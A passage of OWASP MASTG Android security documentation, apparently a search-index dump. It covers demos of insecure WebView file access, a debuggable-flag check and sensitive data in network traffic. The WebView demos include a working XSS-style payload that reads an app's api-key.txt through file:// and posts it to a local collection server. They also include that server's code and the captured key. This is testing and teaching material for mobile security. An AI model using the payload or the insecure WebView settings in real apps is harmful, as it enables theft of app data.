the same way).\n        webView.loadDataWithBaseURL(\n            \"file:///\",\n            vulnerableHtml,\n            \"text/html\",\n            \"UTF-8\",\n            null\n        )\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#androidmanifestxml","title":"AndroidManifest.xml","text":"<p>Note that for the exfiltration to work we include the <code>android:usesCleartextTraffic=\"true\"</code> attribute in the <code>AndroidManifest.xml</code> file to allow cleartext traffic. However, the same script would work with HTTPS endpoints.</p>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#mastgtestwebviewkt","title":"MastgTestWebView.kt","text":"<p>The code includes a script that demonstrates how an attacker could exploit the WebView settings to exfiltrate sensitive data from the app's internal storage using file URIs (<code>file://</code>).</p> <p>This sample:</p> <ul> <li>writes a sensitive file (<code>api-key.txt</code>) into internal storage using <code>File.writeText()</code>.</li> <li>configures a WebView to<ul> <li>allow JavaScript execution (<code>javaScriptEnabled = true</code>).</li> <li>allow file access (<code>allowFileAccess = true</code>).</li> <li>allow file access from file URLs (<code>allowFileAccessFromFileURLs = true</code>).</li> <li>allow universal access from file URLs (<code>allowUniversalAccessFromFileURLs = true</code>).</li> </ul> </li> <li>to simulate an XSS attack, the WebView uses <code>loadDataWithBaseURL</code> to load an HTML page with embedded JavaScript controlled by the attacker.</li> </ul>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#html-and-javascript","title":"HTML and JavaScript","text":"<p>See <code>vulnerableHtml</code> in the MastgTestWebView.kt file.</p> <ol> <li>The attacker's script (running in the context of the vulnerable page) uses <code>XMLHttpRequest</code> to load the sensitive file from the file system. The file is located at <code>/data/data/org.owasp.mastestapp/files/api-key.txt</code></li> <li><code>fetch</code> is used to send the file contents to an external server running on the host machine while the app is executed in the Android emulator (<code>http://10.0.2.2:5001/receive</code>).</li> </ol> <p>Note: For demonstration purposes, the exfiltrated data is displayed on screen. However, in a real attack scenario, the user would not notice as the data would be exfiltrated silently.</p>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#serverpy","title":"server.py","text":"<p>A simple Python server that listens for incoming requests on port 5001 and logs the received data.</p> ../MASTG-DEMO-0030/server.py<pre><code>import http.server\nimport socketserver\nimport json\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n\n    def do_POST(self):\n        length = int(self.headers.get('Content-Length', 0))\n        data = self.rfile.read(length)\n        text = data.decode('utf-8')\n        print(f'\\n\\n[*] Received POST data from {self.client_address[0]}:\\n')\n        try:\n            parsed = json.loads(text)\n            pretty = json.dumps(parsed, indent=4)\n            print(pretty)\n        except Exception as e:\n            print(text)\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.end_headers()\n\n    def log_message(self, format, *args):\n        # Suppress the default logging\n        pass\n\nif __name__ == '__main__':\n    with socketserver.TCPServer(('0.0.0.0', 5001), Handler) as httpd:\n        print('Serving on port 5001...')\n        httpd.serve_forever()\n</code></pre>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for Android installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn the app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code> and/or <code>q</code> to quit the Frida CLI</li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp -l ../MASTG-DEMO-0030/script.js -o output.txt\n</code></pre> <pre><code>// Configuration parameter:\n// Set to true to wait for the first call to getSettings() before enumerating WebViews.\n// Set to false to enumerate immediately.\nvar delayEnumerationUntilGetSettings = true;\n\nJava.perform(function() {\n  var seenWebViews = {};\n  var internalCall = false; // Flag to indicate internal calls\n\n  // Function to print backtrace with a configurable number of lines (default: 5)\n  function printBacktrace(maxLines = 8) {\n    let Exception = Java.use(\"java.lang.Exception\");\n    let stackTrace = Exception.$new().getStackTrace().toString().split(\",\");\n\n    console.log(\"\\nBacktrace:\");\n    for (let i = 0; i &lt; Math.min(maxLines, stackTrace.length); i++) {\n        console.log(stackTrace[i]);\n    }\n    console.log(\"\\n\");\n  }\n\n  function enumerateWebViews() {\n    Java.choose(\"android.webkit.WebView\", {\n      onMatch: function(instance) {\n        var id = instance.toString();\n        if (seenWebViews[id]) return;  // Skip if already seen\n        seenWebViews[id] = true;\n        Java.scheduleOnMainThread(function() {\n          console.log(`\\n[*] Found WebView instance: ${id}`);\n          try {\n            internalCall = true; // Set flag before calling getSettings\n            var settings = instance.getSettings();\n            internalCall = false; // Reset flag after calling getSettings\n            console.log(`\\t[+] JavaScriptEnabled: ${settings.getJavaScriptEnabled()}`);\n            console.log(`\\t[+] AllowFileAccess: ${settings.getAllowFileAccess()}`);\n            console.log(`\\t[+] AllowFileAccessFromFileURLs: ${settings.getAllowFileAccessFromFileURLs()}`);\n            console.log(`\\t[+] AllowUniversalAccessFromFileURLs: ${settings.getAllowUniversalAccessFromFileURLs()}`);\n            console.log(`\\t[+] AllowContentAccess: ${settings.getAllowContentAccess()}`);\n            console.log(`\\t[+] MixedContentMode: ${settings.getMixedContentMode()}`);\n            console.log(`\\t[+] SafeBrowsingEnabled: ${settings.getSafeBrowsingEnabled()}`);\n          } catch (err) {\n            console.log(`\\t[-] Error reading settings: ${err}`);\n          }\n        });\n      },\n      onComplete: function() {\n        console.log(\"\\n[*] Finished enumerating WebView instances!\");\n      }\n    });\n  }\n\n  var WebView = Java.use(\"android.webkit.WebView\");\n\n  if (delayEnumerationUntilGetSettings) {\n    var enumerationTriggered = false;\n    WebView.getSettings.implementation = function() {\n      if (internalCall) {\n        return this.getSettings(); // Return immediately if it's an internal call\n      }\n      var settings = this.getSettings();\n      var id = this.toString();\n      console.log(`\\n[*] WebView.getSettings() called on instance: ${id}`);\n      printBacktrace();\n      if (!enumerationTriggered) {\n        enumerationTriggered = true;\n        Java.scheduleOnMainThread(function() {\n          console.log(\"\\n[*] Triggering enumeration after getSettings() call...\");\n          enumerateWebViews();\n        });\n      }\n      return settings;\n    };\n  } else {\n    enumerateWebViews();\n  }\n});\n</code></pre> <p>The Frida script is designed to enumerate instances of <code>WebView</code> in the application and list their configuration values. The script does not explicitly hook the setters of the <code>WebView</code> settings but instead calls the <code>getSettings()</code> method to retrieve the current configuration.</p> <p>The script performs the following steps:</p> <ol> <li>Enumerates all instances of <code>WebView</code> in the application.</li> <li>For each <code>WebView</code> instance, it calls the <code>getSettings()</code> method to retrieve the current settings.</li> <li>Prints the configuration values of the <code>WebView</code> settings.</li> <li>Prints a backtrace when the <code>getSettings()</code> method is called to help identify where in the code the settings are being accessed.</li> </ol>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#observation","title":"Observation","text":"<p>The output shows that Frida found one WebView instance and lists many of the WebView settings. A backtrace is also provided to help identify where in the code the settings are being accessed.</p> output.txt<pre><code>[*] WebView.getSettings() called on instance: android.webkit.WebView{72e86a8 VFEDHVC.. ......I. 0,0-0,0}\n\nBacktrace:\nandroid.webkit.WebView.getSettings(Native Method)\norg.owasp.mastestapp.MastgTestWebView.mastgTest(MastgTestWebView.kt:26)\norg.owasp.mastestapp.MainActivityWebViewKt$WebViewScreen$1$1$2$1.invoke(MainActivityWebView.kt:88)\norg.owasp.mastestapp.MainActivityWebViewKt$WebViewScreen$1$1$2$1.invoke(MainActivityWebView.kt:85)\nandroidx.compose.ui.viewinterop.ViewFactoryHolder.&lt;init&gt;(AndroidView.android.kt:343)\nandroidx.compose.ui.viewinterop.AndroidView_androidKt$createAndroidViewNodeFactory$1.invoke(AndroidView.android.kt:274)\nandroidx.compose.ui.viewinterop.AndroidView_androidKt$createAndroidViewNodeFactory$1.invoke(AndroidView.android.kt:273)\nandroidx.compose.ui.viewinterop.AndroidView_androidKt$AndroidView$$inlined$ComposeNode$1.invoke(Composables.kt:254)\n\n\n\n[*] Triggering enumeration after getSettings() call...\n\n[*] Finished enumerating WebView instances!\n\n[*] Found WebView instance: android.webkit.WebView{72e86a8 VFEDHVC.. ........ 0,0-904,1796}\n    [+] JavaScriptEnabled: true\n    [+] AllowFileAccess: true\n    [+] AllowFileAccessFromFileURLs: true\n    [+] AllowUniversalAccessFromFileURLs: false\n    [+] AllowContentAccess: true\n    [+] MixedContentMode: 1\n    [+] SafeBrowsingEnabled: true\n</code></pre> <p>We can also see how the sensitive data was exfiltrated to the attacker's server by inspecting the server logs.</p> output_server.txt<pre><code>Serving on port 5001...\n\n\n[*] Received POST data from 127.0.0.1:\n\nMASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b\n</code></pre>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#evaluation","title":"Evaluation","text":"<p>The test fails due to the following WebView settings being configured:</p> evaluation.txt<pre><code>setJavaScriptEnabled: True\nsetAllowFileAccess: True\nsetAllowFileAccessFromFileURLs: True\nsetAllowUniversalAccessFromFileURLs: False\n</code></pre> <p>Note that using this approach we can't really tell if the methods are explicitly called in the code since we're inspecting the WebView settings after they have been configured. However, in this case, all methods detected must have been explicitly called in the code since the settings are not enabled by default.</p> <p>As indicated by the backtrace in the output, the settings were called in the <code>mastgTest</code> method of the <code>MastgTestWebView</code> class. Since this app is a demo and symbols aren't stripped, we can even see the exact file and line number where the settings were configured: <code>MastgTestWebView.kt:25</code>.</p>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0032/MASTG-DEMO-0032/","title":"MASTG-DEMO-0032: Uses of WebViews Allowing Local File Access with semgrep","text":"<p>  Download MASTG-DEMO-0032 APK   Open MASTG-DEMO-0032 Folder  Build MASTG-DEMO-0032 APK</p>","tags":["android","demo","MASTG-TEST-0252"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0032/MASTG-DEMO-0032/#sample","title":"Sample","text":"<p>This sample demonstrates the use of WebViews allowing local file access in an Android app and how an attacker could exploit these settings to exfiltrate sensitive data from the app's internal storage using <code>file://</code> URIs.</p> <p>In this demo we focus on the static analysis of the code using semgrep and don't run the app nor the attacker server.</p> <p>See  Uses of WebViews Allowing Local File Access with Frida for all the details about the sample and the attack.</p> MastgTestWebView.ktAndroidManifest.xml <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.webkit.WebView\nimport java.io.*\n\n/**\n * This class writes a sensitive file (\"api-key.txt\") into internal storage and then loads a vulnerable\n * page into a WebView. That page simulates an XSS injection:\n * an attacker's script (running in the context of the vulnerable page) makes an `XMLHttpRequest` to\n * read the sensitive file via the file system and then uses `fetch` to send the content to an external server.\n *\n * By loading the page with a `file://` base URL and enabling universal access from file URLs,\n * we relax the default restriction (which would otherwise treat `file://` requests as opaque origin)\n * and allow the `XMLHttpRequest` to succeed.\n */\nclass MastgTestWebView(private val context: Context) {\n\n    fun mastgTest(webView: WebView) {\n        // Write a sensitive file (for example, cached credentials or private data).\n        val sensitiveFile = File(context.filesDir, \"api-key.txt\")\n        sensitiveFile.writeText(\"MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b\")\n        val filePath = sensitiveFile.absolutePath\n\n        // Configure the WebView.\n        webView.settings.apply {\n            /* `javaScriptEnabled` is required for the attacker's script to even execute.\n             * This is very common in WebViews, unless they only load static content.\n            */\n            javaScriptEnabled = true\n\n            /* `allowFileAccess` is required in this attack since it\n             * allows the WebView to load local files from the app's internal or external storage.\n             * This app has a `minSdkVersion` of 29, the default value is `true`\n             * unless you run it on a device with an API level of 30 or higher.\n            */\n            allowFileAccess = true\n\n            /* `allowFileAccessFromFileURLs` is required in this attack since it\n             * lets JavaScript within those local files access other local files.\n            */\n            allowFileAccessFromFileURLs = true\n\n            /* `allowUniversalAccessFromFileURLs` is not really required in this attack because\n             * the `allowFileAccessFromFileURLs` setting already allows the attacker's script to\n             * access the sensitive file via the file system.\n            */\n            // allowUniversalAccessFromFileURLs = true\n        }\n\n        // Vulnerable HTML simulating an XSS injection.\n        // The attacker-injected script uses XMLHttpRequest to load the sensitive file from the file system.\n        val vulnerableHtml = \"\"\"\n            &lt;html&gt;\n              &lt;head&gt;\n                &lt;meta charset=\"utf-8\"&gt;\n                &lt;title&gt;MASTG-DEMO&lt;/title&gt;\n              &lt;/head&gt;\n              &lt;body&gt;\n                &lt;h1&gt;MASTG-DEMO-0032&lt;/h1&gt;\n                &lt;p&gt;This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using file:// URIs.&lt;/p&gt;\n                &lt;p&gt;The file is located in $filePath&lt;/p&gt;\n                &lt;p&gt;NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.&lt;/p&gt;\n                &lt;script type=\"text/javascript\"&gt;\n                  function exfiltrate(data) {\n\n                    var output = document.createElement(\"div\");\n                    output.style.color = \"white\";\n                    output.style.borderRadius = \"5px\";\n                    output.style.backgroundColor = \"red\";\n                    output.style.padding = \"1em\";\n                    output.style.marginTop = \"1em\";\n                    output.innerHTML = \"&lt;strong&gt;Exfiltrated Data:&lt;/strong&gt;&lt;br&gt;\" + data;\n                    document.body.appendChild(output);\n\n                    // Send the text file content to the external server\n                    fetch('http://10.0.2.2:5001/receive', {\n                        method: 'POST',\n                        headers: {\n                            'Content-Type': 'text/plain'\n                        },\n                        body: data\n                    })\n                    .then(response =&gt; console.log('File content sent successfully.'))\n                    .catch(err =&gt; console.error('Error sending file content:', err));\n                  }\n                    function readSensitiveFile() {\n                      var xhr = new XMLHttpRequest();\n                      xhr.onreadystatechange = function() {\n                        if (xhr.readyState === XMLHttpRequest.DONE) {\n                          // For local file requests, a status of 0 with a non-empty responseText indicates success.\n                          if (xhr.status === 200 || (xhr.status === 0 &amp;&amp; xhr.responseText)) {\n                            exfiltrate(xhr.responseText);\n                          } else {\n                            exfiltrate(\"Error reading file: \" + xhr.status);\n                          }\n                        }\n                      };\n\n                      xhr.onerror = function() {\n                        exfiltrate(\"Network error occurred while reading the file.\");\n                      };\n\n                      xhr.open(\"GET\", \"$filePath\", true);\n                      xhr.send();\n                    }\n                  // Simulate the injected payload triggering.\n                  readSensitiveFile();\n                &lt;/script&gt;\n              &lt;/body&gt;\n            &lt;/html&gt;\n        \"\"\".trimIndent()\n\n        // Load the vulnerable HTML.\n        // Using a base URL with the file:// scheme gives the page a non\u2011opaque origin (using content:/// works the same way).\n        webView.loadDataWithBaseURL(\n            \"file:///\",\n            vulnerableHtml,\n            \"text/html\",\n            \"UTF-8\",\n            null\n        )\n    }\n}\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:usesCleartextTraffic=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivityWebView\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0252"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0032/MASTG-DEMO-0032/#steps","title":"Steps","text":"<p>Let's run  semgrep rules against the sample code.</p> ../../../../rules/mastg-android-webview-allow-local-access.yml<pre><code>rules:\n  - id: mastg-android-webview-settings\n    severity: INFO\n    languages:\n      - java\n    metadata:\n      summary: This rule detects WebView settings related to local file access and JavaScript execution.\n    message: \"[MASVS-PLATFORM-2] Detected WebView settings.\"\n    pattern-either:\n      - pattern: $WEBVIEW.getSettings(...);\n      - pattern: $SETTINGS.setJavaScriptEnabled($ARG);\n      - pattern: $SETTINGS.setAllowContentAccess($ARG);\n      - pattern: $SETTINGS.setAllowFileAccessFromFileURLs($ARG);\n      - pattern: $SETTINGS.setAllowFileAccess($ARG);\n      - pattern: $SETTINGS.setAllowUniversalAccessFromFileURLs($ARG);\n</code></pre> run.sh<pre><code>#!/bin/bash\nNO_COLOR=true semgrep -c ../../../../rules/mastg-android-webview-allow-local-access.yml ./MastgTestWebView_reversed.java &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0252"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0032/MASTG-DEMO-0032/#observation","title":"Observation","text":"<p>The output shows all WebView settings found in the code.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 4 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTestWebView_reversed.java\n     \u2771 rules.mastg-android-webview-settings\n          [MASVS-PLATFORM-2] Detected WebView settings.\n\n           29\u2506 WebSettings $this$mastgTest_u24lambda_u240 = webView.getSettings();\n            \u22ee\u2506----------------------------------------\n           30\u2506 $this$mastgTest_u24lambda_u240.setJavaScriptEnabled(true);\n            \u22ee\u2506----------------------------------------\n           31\u2506 $this$mastgTest_u24lambda_u240.setAllowFileAccess(true);\n            \u22ee\u2506----------------------------------------\n           32\u2506 $this$mastgTest_u24lambda_u240.setAllowFileAccessFromFileURLs(true);\n</code></pre>","tags":["android","demo","MASTG-TEST-0252"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0032/MASTG-DEMO-0032/#evaluation","title":"Evaluation","text":"<p>The test fails due to the following WebView settings being configured:</p> evaluation.txt<pre><code>setJavaScriptEnabled: True\nsetAllowFileAccess: True\nsetAllowFileAccessFromFileURLs: True\nsetAllowUniversalAccessFromFileURLs: False\n</code></pre> <p>All these settings are explicitly set to <code>true</code> in the code, otherwise, they would remain at their default values (<code>false</code>).</p>","tags":["android","demo","MASTG-TEST-0252"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0040/MASTG-DEMO-0040/","title":"MASTG-DEMO-0040: Debuggable Flag Enabled in the AndroidManifest with semgrep","text":"<p>  Download MASTG-DEMO-0040 APK   Open MASTG-DEMO-0040 Folder  Build MASTG-DEMO-0040 APK</p>","tags":["android","demo","MASTG-TEST-0226"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0040/MASTG-DEMO-0040/#sample","title":"Sample","text":"<p>The code snippet below shows a sample manifest file with the debuggable flag enabled.</p> AndroidManifest.xmlAndroidManifest_reversed.xml <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:debuggable=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"35\" android:compileSdkVersionCodename=\"15\" package=\"org.owasp.mastestapp\" platformBuildVersionCode=\"35\" platformBuildVersionName=\"15\"&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;\n    &lt;permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\" android:protectionLevel=\"signature\"/&gt;\n    &lt;uses-permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"/&gt;\n    &lt;application android:allowBackup=\"true\" android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\" android:dataExtractionRules=\"@xml/data_extraction_rules\" android:debuggable=\"true\" android:extractNativeLibs=\"false\" android:fullBackupContent=\"@xml/backup_rules\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:theme=\"@style/Theme.MASTestApp\"&gt;\n        &lt;activity android:exported=\"true\" android:name=\"org.owasp.mastestapp.MainActivity\" android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.compose.ui.tooling.PreviewActivity\"/&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.activity.ComponentActivity\"/&gt;\n        &lt;provider android:authorities=\"org.owasp.mastestapp.androidx-startup\" android:exported=\"false\" android:name=\"androidx.startup.InitializationProvider\"&gt;\n            &lt;meta-data android:name=\"androidx.emoji2.text.EmojiCompatInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.lifecycle.ProcessLifecycleInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.profileinstaller.ProfileInstallerInitializer\" android:value=\"androidx.startup\"/&gt;\n        &lt;/provider&gt;\n        &lt;receiver android:directBootAware=\"false\" android:enabled=\"true\" android:exported=\"true\" android:name=\"androidx.profileinstaller.ProfileInstallReceiver\" android:permission=\"android.permission.DUMP\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.INSTALL_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SKIP_FILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SAVE_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.BENCHMARK_OPERATION\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/receiver&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0226"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0040/MASTG-DEMO-0040/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the manifest file.</p> ../../../../rules/mastg-android-debuggable-flag.yml<pre><code>rules:\n  - id: mastg-android-debuggable-flag\n    severity: WARNING\n    languages:\n      - xml\n    metadata:\n      summary: This rule inspects the AndroidManifest.xml for the debuggable flag.\n    message: \"[MASVS-RESILIENCE-4] debuggable detected as $ARG.\"\n    patterns:\n      - pattern: 'android:debuggable=\"$ARG\"\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-debuggable-flag.yml ./AndroidManifest_reversed.xml &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0226"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0040/MASTG-DEMO-0040/#observation","title":"Observation","text":"<p>The rule has identified the <code>android:debuggable</code> attribute in the AndroidManifest.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    AndroidManifest_reversed.xml\n    \u276f\u2771 mastg-android-debuggable-flag\n          [MASVS-RESILIENCE-4] debuggable detected as true.\n\n            5\u2506 &lt;application android:allowBackup=\"true\"                                           \n               android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\"              \n               android:dataExtractionRules=\"@xml/data_extraction_rules\" android:debuggable=\"true\"\n               android:extractNativeLibs=\"false\" android:fullBackupContent=\"@xml/backup_rules\"   \n               android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\"               \n               android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\"          \n               android:theme=\"@style/Theme.MASTestApp\"&gt;                                                                           \n</code></pre>","tags":["android","demo","MASTG-TEST-0226"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0040/MASTG-DEMO-0040/#evaluation","title":"Evaluation","text":"<p>The test case fails because the <code>android:debuggable</code> attribute is explicitly set to <code>true</code>.</p>","tags":["android","demo","MASTG-TEST-0226"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0009/MASTG-DEMO-0009/","title":"MASTG-DEMO-0009: Detecting Sensitive Data in Network Traffic","text":"<p>  Download MASTG-DEMO-0009 APK   Open MASTG-DEMO-0009 Folder  Build MASTG-DEMO-0009 APK</p>","tags":["android","demo","MASTG-TEST-0206"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0009/MASTG-DEMO-0009/#sample","title":"Sample","text":"<p>The snippet below shows sample code that sends sensitive data over the network using the <code>HttpURLConnection</code> class. The data is sent to <code>https://httpbin.org/post</code> which is a dummy endpoint that returns the data it receives.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.BufferedOutputStream\nimport java.io.BufferedWriter\nimport java.io.OutputStreamWriter\nimport java.net.HttpURLConnection\nimport java.net.URL\nimport java.net.URLEncoder\nimport java.util.logging.Logger\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String { \n\n        val SENSITIVE_DATA = mapOf(\n            \"precise_location_latitude\" to \"37.7749\",\n            \"precise_location_longitude\" to \"-122.4194\",\n            \"name\" to \"John Doe\",\n            \"email_address\" to \"john.doe@example.com\",\n            \"phone_number\" to \"+11234567890\",\n            \"credit_card_number\" to \"1234 5678 9012 3456\"\n        )\n\n        var result = \"\"\n\n        val thread = Thread {\n            try {\n                val url = URL(\"https://httpbin.org/post\")\n                val httpURLConnection = url.openConnection() as HttpURLConnection\n                httpURLConnection.requestMethod = \"POST\"\n                httpURLConnection.doOutput = true\n                httpURLConnection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\")\n\n                // Creating POST data from the SENSITIVE_DATA map\n                val postData = SENSITIVE_DATA.map { (key, value) -&gt;\n                    \"${URLEncoder.encode(key, \"UTF-8\")}=${URLEncoder.encode(value, \"UTF-8\")}\"\n                }.joinToString(\"&amp;\")\n\n                val outputStream = BufferedOutputStream(httpURLConnection.outputStream)\n                val bufferedWriter = BufferedWriter(OutputStreamWriter(outputStream, \"UTF-8\"))\n                bufferedWriter.write(postData)\n                bufferedWriter.flush()\n                bufferedWriter.close()\n                outputStream.close()\n\n                val responseCode = httpURLConnection.responseCode\n                val responseContent = httpURLConnection.inputStream.bufferedReader().readText()\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    Log.d(\"HTTP_SUCCESS\", \"Successfully authenticated.\")\n                } else {\n                    Log.e(\"HTTP_ERROR\", \"Failed to authenticate. Response code: $responseCode\")\n                }\n                result = \"$responseCode\\n\\n$responseContent\"\n\n            } catch (e: Exception) {\n                e.printStackTrace()\n            }\n        }\n        thread.start()\n        thread.join()\n\n        return result\n    }\n\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Log;\nimport androidx.autofill.HintConstants;\nimport java.io.BufferedOutputStream;\nimport java.io.BufferedWriter;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.net.URLEncoder;\nimport java.util.ArrayList;\nimport 